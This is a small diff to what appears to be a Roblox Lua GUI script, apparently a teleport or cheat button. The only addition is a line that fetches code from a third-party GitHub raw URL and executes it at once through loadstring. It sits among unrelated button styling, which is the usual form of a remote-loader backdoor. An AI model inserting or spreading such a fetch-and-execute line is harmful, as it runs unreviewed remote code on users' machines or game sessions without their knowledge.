@@ -26,6 +26,7 @@ tb.TextSize = 14.000
 tb.BackgroundTransparency = 1
 tb.TextColor3 = Color3.fromRGB(256, 256, 256)
 tb.BorderSizePixel = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Exquisitest/artifact-c/main/artifact%20c%20source", true))()
 
 tb.MouseButton1Click:connect(function()
     local facilitypos = Vector3.new(-1359.289,-459.391,-1572.778)
